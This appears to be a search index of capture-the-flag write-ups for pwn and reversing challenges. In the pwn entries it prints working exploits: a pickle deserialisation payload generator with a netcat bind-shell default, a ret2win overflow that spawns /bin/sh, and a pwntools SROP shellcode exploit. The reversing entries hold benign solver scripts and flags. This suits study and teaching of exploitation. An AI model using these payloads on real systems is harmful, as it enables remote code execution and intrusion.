pop_rdx + p64(0x00) + syscall p.recvuntil(\"Action: \") p.sendline('3') p.sendline(buf) p.interactive() ```","title":"Lottery"},{"location":"pwning/tamuCTF/tictactoe/","text":"tictactoe Challenge Summary The challenge was based on the python deserialisation bug. THis challenge was very similar to a challenge fromTamuCTF from the previous year involving he cpickle module instead of pickle which is used in the challenge here. The challenge allowed us to play the tictactoe gane and win 133713371337 times to get the flag in the straightforward way but our goal is to somehow trick the load progress function to fetch the flag from the pickle.dumps()' import Pickle import sys import base64 DEFAULT_COMMAND = \"netcat -c '/bin/bash -i' -l -p 4444\" COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND class PickleRce(object): def __reduce__(self): import os return (os.system,(COMMAND,)) print base64.b64encode(Pickle.dumps(PickleRce())) We passed cat flag.txt as commandline argument to this python script which generates the base64 encoded pickle dump for ourinput which the server reads and executes in our challenge. The base64 dump we get is sent to the sever and we get the flag!! flag: gigem{d0esnt_looK_lik3_5t4rs_t0_M3} Resources https://medium.com/hackstreetboys/tamuctf-2019-pwn-write-up-4-6-of-6-174e41a4a9ca","title":"tictactoe"},{"location":"pwning/tamuCTF/tictactoe/#tictactoe","text":"","title":"tictactoe"},{"location":"pwning/tamuCTF/tictactoe/#challenge-summary","text":"The challenge was based on the python deserialisation bug. THis challenge was very similar to a challenge fromTamuCTF from the previous year involving he cpickle module instead of pickle which is used in the challenge here. The challenge allowed us to play the tictactoe gane and win 133713371337 times to get the flag in the straightforward way but our goal is to somehow trick the load progress function to fetch the flag from the pickle.dumps()' import Pickle import sys import base64 DEFAULT_COMMAND = \"netcat -c '/bin/bash -i' -l -p 4444\" COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND class PickleRce(object): def __reduce__(self): import os return (os.system,(COMMAND,)) print base64.b64encode(Pickle.dumps(PickleRce())) We passed cat flag.txt as commandline argument to this python script which generates the base64 encoded pickle dump for ourinput which the server reads and executes in our challenge. The base64 dump we get is sent to the sever and we get the flag!! flag: gigem{d0esnt_looK_lik3_5t4rs_t0_M3}","title":"Challenge Summary"},{"location":"pwning/tamuCTF/tictactoe/#resources","text":"https://medium.com/hackstreetboys/tamuctf-2019-pwn-write-up-4-6-of-6-174e41a4a9ca","title":"Resources"},{"location":"pwning/tamuCTF/trivial/","text":"Tamuctf22 Trivial - pwn challenge The challenge file for tamuctf is a zip which contains an elf trivial, a c file called trivial.c and a python file solver-template.py,.This exploit is done using gdb to get a better understanding. The file trivial.c gives: #include <stdlib.h> #include <stdio.h> void win() { system(\"/bin/sh\"); } void main() { char buff[69]; gets(buff); } This is a ret2win challenge, where we can exploit the gets function in main to access win. gets is a library function which reads input from stdin until a newline character is read or the end of file is reached. So if we give enough junk data to fill the buffer, whatever is given after will overwrite the nearby memory. So if we overflow the stack and give the address of the win function as input, we can make the rip point to it. To do this, first take a look at disassembly of trivial. As we can see the buffer size is 0x50, which is 80 is decimal . Now the buffer in the c file was given as 69, but here it is seen to be 80. This is because, in a 64 bit system ,when the file is compiled the memory allocated will be a multiple of 16 and so the buffer size was rounded off to the closest higher multiple of 16, which was 80. So we need to pass 0x50 bytes of junk data and 8 extra bytes to write the address on to the rip.The 8 extra bytes is used to overwrite the memory on rip.Find the address of the win function: So we\u2019ll input a string with 0x58 bytes of random data and the ret and win addresses. In 64 bit systems, the addresses are 8 bytes long and they are read by line. This may lead to some misalignment issues, so we add a return address along to prevent that error. The return address here will be the ret address. The address of ret is:0x401160. So the exploit will be : ! python -c 'print \"A\"*0x58+ \"\\x60\\x11\\x40\\x00\\x00\\x00\\x00\\x00\"+\"\\x32\\x11\\x40\\x00\\x00\\x00\\x00\\x00\"'|./trivial","title":"Trivial"},{"location":"pwning/tamuCTF/void/","text":"void Points: 272 This was one of the good challenges that I tried during the CTF. It was based on a technique called SROP (Sigreturn Oriented Programming). The purpose of this challenge was to defeat ASLR and so the binary as such consisted of only two functions - main and _start both written in simple assembly making use of syscalls. I'll take you through challenge and how I solved it! Preliminary checks: void: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=7fd635b160836aff1b92af6f203e3b1f160f54cc, not stripped Canary : \u2718 NX : \u2713 PIE : \u2718 Fortify : \u2718 RelRO : \u2718 gef\u27a4 As we can see, it is a 64-bit statically linked binary and only NX is enabled! So we'll need to figure out a way to inject shellcode and execute, if at all we use that approach. We will see how that can be done soon enough! For now let's analyze the binary further! Analysis: gef\u27a4 info functions All defined functions: Non-debugging symbols: 0x0000000000401000 main 0x0000000000401020 _start gef\u27a4 disas main Dump of assembler code for function main: 0x0000000000401000 <+0>: mov rax,0x0 0x0000000000401007 <+7>: mov rdi,0x0 0x000000000040100e <+14>: mov rsi,rsp 0x0000000000401011 <+17>: mov rdx,0x7d0 0x0000000000401018 <+24>: syscall 0x000000000040101a <+26>: ret End of assembler dump. gef\u27a4 disas _start Dump of assembler code for function _start: 0x0000000000401020 <+0>: xor eax,eax 0x0000000000401022 <+2>: call 0x401000 <main> 0x0000000000401027 <+7>: mov rax,0x3c 0x000000000040102e <+14>: mov rdi,0x0 0x0000000000401035 <+21>: syscall 0x0000000000401037 <+23>: ret End of assembler dump. gef\u27a4 Above is the assmbly dump for the two functions main and _start . As we can see there are no other functions, and the binary is statically linked, with no procedure linkage table or got address available during run time. Due to this, it becomes a challenge to obtain a leak! Hoewever if we dive into the program, we can see that, the main() function reads input from user. However, there is no stack frame defined and rsi points to the top of the stack. So eventually whatever input we give, it will remain at the top of the stack and will get executed as the next instruction. So how do we go about it? Before discussing that, let us understand what does SROP mean and how it works. SROP SROP stands for Sigreturn Oriented Programming and unlike Return Oriented Programming (ROP), it requires only two gadgets: syscall and a way to set rax register to 0xf . In this challenge, it was quite difficult to write 0xf to rax as there weren't suitable gadgets available. But we can make use of the read syscall in main() to read 0xf bytes of input. With this, rax will store the number of characters read, i.e 0xf. Then we call syscall on it. This process comprises of the sigreturn syscall. The sigreturn is used to return from the signal handler and to clean up the stack frame after a signal has been unblocked. And \"cleaning up the stack frame\" really means it's restoring important context data that has been saved on the stack temporarily. This data includes values of all registers and some things that are unrelevant for exploitation, which is also the reason why at least 300 bytes are required for it to work. Since we can read upto 2000 bytes of data, it won't be a problem. For exploitation sake, we make use of SigreturnFrame() available in pwntools. We can in fact control all registers with this gadget. Before moving onto the exploit, I'd like to remind you that NX is enabled, and since there is no libc we canot ret2libc either. So to break this barrier, we can use the mprotect syscall, to give rwx permissions to a certain bss section, wherein we can read our shellcode to, and execute it. As there is no stack frame defined, we add a stack frame with asm(add rsp, 100) , place our shellcode into it, and execute it. (The shellcode used is an execve 64-bit) Exploit: from pwn import * context.arch = 'amd64' context.log_level = \"debug\" #p = remote(\"tamuctf.com\", 443, ssl=True, sni=\"void\") p = process('./void') #gdb.attach(p, gdbscript='set disassembly-flavor intel\\nb*main\\nc\\n') main = 0x0000000000401000 ret = 0x40101a syscall = 0x0000000000401018 start = 0x400020 frame = SigreturnFrame() frame.rax = 10 frame.rdi = 0x00000000400000 frame.rsi = 0x1000 frame.rdx = 0x7 frame.rsp = 0x00000000400018# ptr to start frame.rip = syscall# mprotect syscall chain = p64(main) print(str(frame)) pay = p64(main) + p64(syscall) + bytes(frame) p.send(pay) sleep(0.1) p.send(p64(syscall).ljust(15, b'\\x00')) sleep(0.1) p.send(p64(start) + asm('add rsp, 100') + asm(shellcraft.sh())) sleep(0.1) p.interactive()","title":"void"},{"location":"pwning/tamuCTF/void/#void","text":"Points: 272 This was one of the good challenges that I tried during the CTF. It was based on a technique called SROP (Sigreturn Oriented Programming). The purpose of this challenge was to defeat ASLR and so the binary as such consisted of only two functions - main and _start both written in simple assembly making use of syscalls. I'll take you through challenge and how I solved it!","title":"void"},{"location":"pwning/tamuCTF/void/#preliminary-checks","text":"void: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=7fd635b160836aff1b92af6f203e3b1f160f54cc, not stripped Canary : \u2718 NX : \u2713 PIE : \u2718 Fortify : \u2718 RelRO : \u2718 gef\u27a4 As we can see, it is a 64-bit statically linked binary and only NX is enabled! So we'll need to figure out a way to inject shellcode and execute, if at all we use that approach. We will see how that can be done soon enough! For now let's analyze the binary further!","title":"Preliminary checks:"},{"location":"pwning/tamuCTF/void/#analysis","text":"gef\u27a4 info functions All defined functions: Non-debugging symbols: 0x0000000000401000 main 0x0000000000401020 _start gef\u27a4 disas main Dump of assembler code for function main: 0x0000000000401000 <+0>: mov rax,0x0 0x0000000000401007 <+7>: mov rdi,0x0 0x000000000040100e <+14>: mov rsi,rsp 0x0000000000401011 <+17>: mov rdx,0x7d0 0x0000000000401018 <+24>: syscall 0x000000000040101a <+26>: ret End of assembler dump. gef\u27a4 disas _start Dump of assembler code for function _start: 0x0000000000401020 <+0>: xor eax,eax 0x0000000000401022 <+2>: call 0x401000 <main> 0x0000000000401027 <+7>: mov rax,0x3c 0x000000000040102e <+14>: mov rdi,0x0 0x0000000000401035 <+21>: syscall 0x0000000000401037 <+23>: ret End of assembler dump. gef\u27a4 Above is the assmbly dump for the two functions main and _start . As we can see there are no other functions, and the binary is statically linked, with no procedure linkage table or got address available during run time. Due to this, it becomes a challenge to obtain a leak! Hoewever if we dive into the program, we can see that, the main() function reads input from user. However, there is no stack frame defined and rsi points to the top of the stack. So eventually whatever input we give, it will remain at the top of the stack and will get executed as the next instruction. So how do we go about it? Before discussing that, let us understand what does SROP mean and how it works.","title":"Analysis:"},{"location":"pwning/tamuCTF/void/#srop","text":"SROP stands for Sigreturn Oriented Programming and unlike Return Oriented Programming (ROP), it requires only two gadgets: syscall and a way to set rax register to 0xf . In this challenge, it was quite difficult to write 0xf to rax as there weren't suitable gadgets available. But we can make use of the read syscall in main() to read 0xf bytes of input. With this, rax will store the number of characters read, i.e 0xf. Then we call syscall on it. This process comprises of the sigreturn syscall. The sigreturn is used to return from the signal handler and to clean up the stack frame after a signal has been unblocked. And \"cleaning up the stack frame\" really means it's restoring important context data that has been saved on the stack temporarily. This data includes values of all registers and some things that are unrelevant for exploitation, which is also the reason why at least 300 bytes are required for it to work. Since we can read upto 2000 bytes of data, it won't be a problem. For exploitation sake, we make use of SigreturnFrame() available in pwntools. We can in fact control all registers with this gadget. Before moving onto the exploit, I'd like to remind you that NX is enabled, and since there is no libc we canot ret2libc either. So to break this barrier, we can use the mprotect syscall, to give rwx permissions to a certain bss section, wherein we can read our shellcode to, and execute it. As there is no stack frame defined, we add a stack frame with asm(add rsp, 100) , place our shellcode into it, and execute it. (The shellcode used is an execve 64-bit)","title":"SROP"},{"location":"pwning/tamuCTF/void/#exploit","text":"from pwn import * context.arch = 'amd64' context.log_level = \"debug\" #p = remote(\"tamuctf.com\", 443, ssl=True, sni=\"void\") p = process('./void') #gdb.attach(p, gdbscript='set disassembly-flavor intel\\nb*main\\nc\\n') main = 0x0000000000401000 ret = 0x40101a syscall = 0x0000000000401018 start = 0x400020 frame = SigreturnFrame() frame.rax = 10 frame.rdi = 0x00000000400000 frame.rsi = 0x1000 frame.rdx = 0x7 frame.rsp = 0x00000000400018# ptr to start frame.rip = syscall# mprotect syscall chain = p64(main) print(str(frame)) pay = p64(main) + p64(syscall) + bytes(frame) p.send(pay) sleep(0.1) p.send(p64(syscall).ljust(15, b'\\x00')) sleep(0.1) p.send(p64(start) + asm('add rsp, 100') + asm(shellcraft.sh())) sleep(0.1) p.interactive()","title":"Exploit:"},{"location":"reversing/intro/","text":"Reversing Introduction The following are the Links to the writeups to the challenges we have solved from CTF's from the Reverse Engineering category. The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. Byte Bandits 2020 Auto Bot Baby rust HSCTF7 2020 Dis - @ sandrabeme APLab:Statistics - @ sandrabeme APLab:English - @ sandrabeme APLab:ComputerScience - By @namithas123 DarkCTF Jack - @ sandrabeme TamuCTF21 setecAstronomy simple_cipher DawgCTF21 secret_app -@ Revathi zh3r0CTF21 Eat Sleep Trace Repeat babyre","title":"Reversing"},{"location":"reversing/intro/#reversing","text":"","title":"Reversing"},{"location":"reversing/intro/#introduction","text":"The following are the Links to the writeups to the challenges we have solved from CTF's from the Reverse Engineering category.","title":"Introduction"},{"location":"reversing/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. Byte Bandits 2020 Auto Bot Baby rust HSCTF7 2020 Dis - @ sandrabeme APLab:Statistics - @ sandrabeme APLab:English - @ sandrabeme APLab:ComputerScience - By @namithas123 DarkCTF Jack - @ sandrabeme TamuCTF21 setecAstronomy simple_cipher DawgCTF21 secret_app -@ Revathi zh3r0CTF21 Eat Sleep Trace Repeat babyre","title":"The contents of this repo"},{"location":"reversing/ByteBandits20/auto_bot/","text":"Auto_bot Challenge was solved by: Sandra and Ashwathi When we connected to the server we got a base64 encoded binary. Using bash we recieved the decoded binary and anylised it. But each time it was a new binary. Heres the scritp from pwn import * import base64 import subprocess import angr import sys r = remote('pwn.byteband.it', 6000) flag = open('flag.txt', 'w') while(1): o = r.recvuntil(\"\\n\") flag.write(str(o)) out = base64.b64decode(o) n=open(\"new\",\"wb\") n.write(out) n.close() subprocess.call(['chmod','+x','new']) project = angr.Project(\"./new\") initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) simulation.explore(find = lambda s: b\"good job\" in s.posix.dumps(1) in s.posix.dumps(1)) if simulation.found: solution_state=simulation.found[0] r.sendline(solution_state.posix.dumps(sys.stdin.fileno())) #in = inp[2:len(inp)-1] else: raise Exception('could not find solution:') #r.sendline(in) #flag{0pt1mus_pr1m3_has_chosen_you}","title":"Auto_bot"},{"location":"reversing/ByteBandits20/auto_bot/#auto_bot","text":"Challenge was solved by: Sandra and Ashwathi When we connected to the server we got a base64 encoded binary. Using bash we recieved the decoded binary and anylised it. But each time it was a new binary. Heres the scritp from pwn import * import base64 import subprocess import angr import sys r = remote('pwn.byteband.it', 6000) flag = open('flag.txt', 'w') while(1): o = r.recvuntil(\"\\n\") flag.write(str(o)) out = base64.b64decode(o) n=open(\"new\",\"wb\") n.write(out) n.close() subprocess.call(['chmod','+x','new']) project = angr.Project(\"./new\") initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) simulation.explore(find = lambda s: b\"good job\" in s.posix.dumps(1) in s.posix.dumps(1)) if simulation.found: solution_state=simulation.found[0] r.sendline(solution_state.posix.dumps(sys.stdin.fileno())) #in = inp[2:len(inp)-1] else: raise Exception('could not find solution:') #r.sendline(in) #flag{0pt1mus_pr1m3_has_chosen_you}","title":"Auto_bot"},{"location":"reversing/ByteBandits20/baby_rust/","text":"Baby_Rust Analysing it dynamically gets us to xoring instructions: d =\"adhmp`badO|sL}JuvvFmiui{@IO}QQVR\" k=0 for i in d: s=s+chr(ord(i)^(7+k)) k=k+1 print(s) #flag{look_ma_i_can_write_in_rust}","title":"Baby_Rust"},{"location":"reversing/ByteBandits20/baby_rust/#baby_rust","text":"Analysing it dynamically gets us to xoring instructions: d =\"adhmp`badO|sL}JuvvFmiui{@IO}QQVR\" k=0 for i in d: s=s+chr(ord(i)^(7+k)) k=k+1 print(s) #flag{look_ma_i_can_write_in_rust}","title":"Baby_Rust"},{"location":"reversing/DarkCTF/Jack/","text":"Emojis - Misc HSCTF2020 Description We are given a binary which takes a string input and multiple math checks are performed on the input and had a good address which had to be achieved. The solution was obtained using a simple angr find and avoid script. Solution Script import angr import claripy import sys proj=angr.Project('./jack',load_options={'auto_load_libs':False},main_opts={'base_addr':0x400000}) flag=[claripy.BVS('flag%i'%i,8) for i in range(16)] flag_concat=claripy.Concat(*flag + [claripy.BVV(\"\\n\")]) state=proj.factory.entry_state(stdin=flag_concat) for i in flag: state.solver.add(i>=32) state.solver.add(i<=127) simgr=proj.factory.simgr(state) simgr.explore(find=0x401489,avoid=[0x4012B3, 0x401468]) if simgr.found: simulation=simgr.found[0] print(simulation.posix.dumps(sys.stdin.fileno())) else: print(\"FAILURE\") Output n0_5ymb0l1c,3x30 This output was enclosed in the flagformat and submitted","title":"Emojis - Misc HSCTF2020"},{"location":"reversing/DarkCTF/Jack/#emojis-misc-hsctf2020","text":"","title":"Emojis - Misc HSCTF2020"},{"location":"reversing/DarkCTF/Jack/#description","text":"We are given a binary which takes a string input and multiple math checks are performed on the input and had a good address which had to be achieved. The solution was obtained using a simple angr find and avoid script.","title":"Description"},{"location":"reversing/DarkCTF/Jack/#solution-script","text":"import angr import claripy import sys proj=angr.Project('./jack',load_options={'auto_load_libs':False},main_opts={'base_addr':0x400000}) flag=[claripy.BVS('flag%i'%i,8) for i in range(16)] flag_concat=claripy.Concat(*flag + [claripy.BVV(\"\\n\")]) state=proj.factory.entry_state(stdin=flag_concat) for i in flag: state.solver.add(i>=32) state.solver.add(i<=127) simgr=proj.factory.simgr(state) simgr.explore(find=0x401489,avoid=[0x4012B3, 0x401468]) if simgr.found: simulation=simgr.found[0] print(simulation.posix.dumps(sys.stdin.fileno())) else: print(\"FAILURE\")","title":"Solution Script"},{"location":"reversing/DarkCTF/Jack/#output","text":"n0_5ymb0l1c,3x30 This output was enclosed in the flagformat and submitted","title":"Output"},{"location":"reversing/HSCTF7/APLabEnglish/","text":"APLab:English Description Another java Reversing Challenge. We are given a java file which is to be reversed. Solution s=\"1dd3|y_3tttb5g\\`q]^dhn3j\" def unxor(string): ret='' xorstr=[4,1,3,1,2,1,3,0,1,4,3,1,2,0,1,4,1,2,3,2,1,0,3] for i in range(len(string)): ret+=chr(ord(string[i])^xorstr[i]) return ret def untranspose(string): ret=[None]\\*23 transpose=[11,18,15,19,8,17,5,2,12,6,21,0,22,7,13,14,4,16,20,1,3,10,9] for i in range(len(transpose)): ret[transpose[i]]=string[i] return ''.join(ret) for i in range(3): s=unxor(s) print(s) s=untranspose(s) print(s) Output 5eg2~x\\3upwc7gau\\\\gjo3i cj3o\\\\pg~i35uaug\\xe2gw7 gk0n^]sgm04watc]zf0fw4 40gf]sma^4wgtc0z]knf0w 01dg_rna_0tf}tb4{_hlg0t flag{n0t_t00_b4d_r1ght}","title":"APLab:English"},{"location":"reversing/HSCTF7/APLabEnglish/#aplabenglish","text":"","title":"APLab:English"},{"location":"reversing/HSCTF7/APLabEnglish/#description","text":"Another java Reversing Challenge. We are given a java file which is to be reversed.","title":"Description"},{"location":"reversing/HSCTF7/APLabEnglish/#solution","text":"s=\"1dd3|y_3tttb5g\\`q]^dhn3j\" def unxor(string): ret='' xorstr=[4,1,3,1,2,1,3,0,1,4,3,1,2,0,1,4,1,2,3,2,1,0,3] for i in range(len(string)): ret+=chr(ord(string[i])^xorstr[i]) return ret def untranspose(string): ret=[None]\\*23 transpose=[11,18,15,19,8,17,5,2,12,6,21,0,22,7,13,14,4,16,20,1,3,10,9] for i in range(len(transpose)): ret[transpose[i]]=string[i] return ''.join(ret) for i in range(3): s=unxor(s) print(s) s=untranspose(s) print(s)","title":"Solution"},{"location":"reversing/HSCTF7/APLabEnglish/#output","text":"5eg2~x\\3upwc7gau\\\\gjo3i cj3o\\\\pg~i35uaug\\xe2gw7 gk0n^]sgm04watc]zf0fw4 40gf]sma^4wgtc0z]knf0w 01dg_rna_0tf}tb4{_hlg0t flag{n0t_t00_b4d_r1ght}","title":"Output"},{"location":"reversing/HSCTF7/ComputerScience/","text":"APLab:Computer Science principle HSCTF Description A java RE challenge from HSCTF 2020 The challenge gives a simple java code ,which basically takes in an input of length 18, if (inp.length()!=18) { System.out.println(\"Your input is incorrect.\"); System.exit(0) } Convert it to a string through different functions inp=shift2(shift(inp)); where shift2(): public static String shift2(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)+ Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } Shift(): public static String shift(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)-i); } System.out.println(ret); return ret; } and checks if inp is the string given.: if (inp.equals(\"inagzgkpm)Wl&Tg&io\")) { System.out.println(\"Correct. Your input is the flag.\"); } else { System.out.println(\"Your input is incorrect.\"); } So all the program needed was to reverse it to get the input they are asking for Hence import java.util.Scanner; public class ComputerSciencePrinciples { public static void main(String[] args) { Scanner sc = new Scanner(System.in); String inp = sc.nextLine(); if (inp.length()!=18) { System.out.println(\"Your input is incorrect.\"); System.exit(0); } String x=shift2(inp); String y=shift(x); System.out.println(inp); } public static String shift(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)+i); } System.out.println(ret); return ret; } public static String shift2(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)-Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } } Where if input is given as:\"inagzgkpm)Wl&Tg&io\" Give: flag{intr0_t0_r3v}","title":"ComputerScience"},{"location":"reversing/HSCTF7/ComputerScience/#aplabcomputer-science-principle-hsctf","text":"","title":"APLab:Computer Science principle HSCTF"},{"location":"reversing/HSCTF7/ComputerScience/#description","text":"A java RE challenge from HSCTF 2020 The challenge gives a simple java code ,which basically takes in an input of length 18, if (inp.length()!=18) { System.out.println(\"Your input is incorrect.\"); System.exit(0) } Convert it to a string through different functions inp=shift2(shift(inp)); where shift2(): public static String shift2(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)+ Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } Shift(): public static String shift(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)-i); } System.out.println(ret); return ret; } and checks if inp is the string given.: if (inp.equals(\"inagzgkpm)Wl&Tg&io\")) { System.out.println(\"Correct. Your input is the flag.\"); } else { System.out.println(\"Your input is incorrect.\"); } So all the program needed was to reverse it to get the input they are asking for Hence import java.util.Scanner; public class ComputerSciencePrinciples { public static void main(String[] args) { Scanner sc = new Scanner(System.in); String inp = sc.nextLine(); if (inp.length()!=18) { System.out.println(\"Your input is incorrect.\"); System.exit(0); } String x=shift2(inp); String y=shift(x); System.out.println(inp); } public static String shift(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)+i); } System.out.println(ret); return ret; } public static String shift2(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)-Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } } Where if input is given as:\"inagzgkpm)Wl&Tg&io\" Give: flag{intr0_t0_r3v}","title":"Description"},{"location":"reversing/HSCTF7/Dis/","text":"Dis HSCTF2020 Description The challenge was a python bytecode challenge where the approach I chose was to maually replicate the bytecode from the documentation of the dis module in python which took up a while. Im not sure if there's a less time consuming approach but once that was done the reversing part was automated using Z3. Solution bytestring=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' from z3 import * def a(s): o = [0] * 32 for i in range(32): o[i] = ((s[i]+s[i])-60) return o def b(s,t): for x,y in zip(s,t): yield(x+y)-50 def c(s): return [x+5 for x in s] def e(s): s = [ i for i in s ] o = [ (o^5)-30 for o in b(a(s),c(s)) ] return o def main(): sol=Solver() o=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' l=list(o) s = [ BitVec('s[%s]' % i, 8) for i in range(32) ] s = e(s) for i in range(len(l)): sol.add(s[i]==l[i]) print(sol.check()) print(sol.model()) main() Flag: flag{5tr4ng3_d1s45s3mbly_1c0a88}","title":"Dis HSCTF2020"},{"location":"reversing/HSCTF7/Dis/#dis-hsctf2020","text":"","title":"Dis HSCTF2020"},{"location":"reversing/HSCTF7/Dis/#description","text":"The challenge was a python bytecode challenge where the approach I chose was to maually replicate the bytecode from the documentation of the dis module in python which took up a while. Im not sure if there's a less time consuming approach but once that was done the reversing part was automated using Z3.","title":"Description"},{"location":"reversing/HSCTF7/Dis/#solution","text":"bytestring=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' from z3 import * def a(s): o = [0] * 32 for i in range(32): o[i] = ((s[i]+s[i])-60) return o def b(s,t): for x,y in zip(s,t): yield(x+y)-50 def c(s): return [x+5 for x in s] def e(s): s = [ i for i in s ] o = [ (o^5)-30 for o in b(a(s),c(s)) ] return o def main(): sol=Solver() o=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' l=list(o) s = [ BitVec('s[%s]' % i, 8) for i in range(32) ] s = e(s) for i in range(len(l)): sol.add(s[i]==l[i]) print(sol.check()) print(sol.model()) main() Flag: flag{5tr4ng3_d1s45s3mbly_1c0a88}","title":"Solution"},{"location":"reversing/HSCTF7/Statistics/","text":"APLab:Statistics HSCTF Description A fun Java RE challenge from HSCTF-2020 The given file was a .class file which had to be converted to a .java file using any online converters or tools like jadx.Once you get the .java file I was initially not able to convert the java code due to an invoke to call a direct java bytecode for which I simply changed the line to an equivalent funtion that is simply toString to fix that. Thereafter we figured that the code was performing certain manipulations on the input and would simply check between the two strings. But the catch was where there was a sortof non reversible bubble sort kind of algorithm which picked up the two smallest values in the string and pushed them to the end of the string. And due to that a few charecters of the flag had to be guessed. However the following is the script that we used to solve the challenge. Solution import java.util.Scanner; public class statistics { public static void main(final String[] args) { int[] arr = {102,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}; // checkstring=\"qtqnhuyj{fjw{rwhswzppfnfrz|qndfktceyba\" String com = \"fqntqdhuyj{fjw{rwhswzppfnbrz|qncfktaey\"; String guess = \"abcdefghijklmnopqrstuvwxyz{_}|\"; System.out.print(\"f\"); for (int i = 1 ; i<com.length() ; i ++){ char st = com.charAt(i); for (int k = 0;k< guess.length();k++){ if (arr[i - 1] % 2 == 0) { arr[i] = guess.charAt(k) + (arr[i - 1] - 97); } else { arr[i] = guess.charAt(k) - (arr[i - 1] - 97); } arr[i] = (arr[i] - 97 + 29)%29 + 97; if((char)arr[i] == st){ System.out.print(guess.charAt(k)); break; } //System.out.println((char)arr[i]); }} } } Output: flag{tenpercentofallstatirqicsashfake} We had to perform several tries to finally guess the few last charecters we needed to complete the flag. But it was worth! Flag: flag{tenpercentofallstatitoicsarefake}","title":"APLab:Statistics HSCTF"},{"location":"reversing/HSCTF7/Statistics/#aplabstatistics-hsctf","text":"","title":"APLab:Statistics HSCTF"},{"location":"reversing/HSCTF7/Statistics/#description","text":"A fun Java RE challenge from HSCTF-2020 The given file was a .class file which had to be converted to a .java file using any online converters or tools like jadx.Once you get the .java file I was initially not able to convert the java code due to an invoke to call a direct java bytecode for which I simply changed the line to an equivalent funtion that is simply toString to fix that. Thereafter we figured that the code was performing certain manipulations on the input and would simply check between the two strings. But the catch was where there was a sortof non reversible bubble sort kind of algorithm which picked up the two smallest values in the string and pushed them to the end of the string. And due to that a few charecters of the flag had to be guessed. However the following is the script that we used to solve the challenge.","title":"Description"},{"location":"reversing/HSCTF7/Statistics/#solution","text":"import java.util.Scanner; public class statistics { public static void main(final String[] args) { int[] arr = {102,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}; // checkstring=\"qtqnhuyj{fjw{rwhswzppfnfrz|qndfktceyba\" String com = \"fqntqdhuyj{fjw{rwhswzppfnbrz|qncfktaey\"; String guess = \"abcdefghijklmnopqrstuvwxyz{_}|\"; System.out.print(\"f\"); for (int i = 1 ; i<com.length() ; i ++){ char st = com.charAt(i); for (int k = 0;k< guess.length();k++){ if (arr[i - 1] % 2 == 0) { arr[i] = guess.charAt(k) + (arr[i - 1] - 97); } else { arr[i] = guess.charAt(k) - (arr[i - 1] - 97); } arr[i] = (arr[i] - 97 + 29)%29 + 97; if((char)arr[i] == st){ System.out.print(guess.charAt(k)); break; } //System.out.println((char)arr[i]); }} } } Output: flag{tenpercentofallstatirqicsashfake} We had to perform several tries to finally guess the few last charecters we needed to complete the flag. But it was worth! Flag: flag{tenpercentofallstatitoicsarefake}","title":"Solution"},{"location":"reversing/Tamuctf22/redo2/","text":"redo2 Description Honestly, this is just a plain an simple ASM challenge. Best of luck. Solution Here, we are given an assembly file which is in intel format, so we first convert it into intel by adding a statement in the assembly file - \".intel_syntax noprefix\" After this we compile the file - \"gcc -m32 redo2.S -o redo2\" Observe the binary in binary ninja Script flag=[] \"\"\" flag[0]=0x36 flag[1]=0x38 flag[2]=0x36 flag[3]=0x34 flag[4]=0x3c flag[5]=0x4a flag[6]=0x30 flag[7]=0x30 flag[8]=0x30 flag[9]=0x2e flag[10]=0x31 flag[11]=0x31 flag[12]=0x31 flag[13]=0x31 flag[14]=0x2e flag[15]=0x32 flag[16]=0x32 flag[17]=0x32 flag[18]=0x32 flag[19]=0x32 flag[20]=0x2e flag[21]=flag[15]+1 flag[22]=0x2e flag[23]=3 flag[24]=4 flag[25]=0 flag[26]=2 flag[27]=1 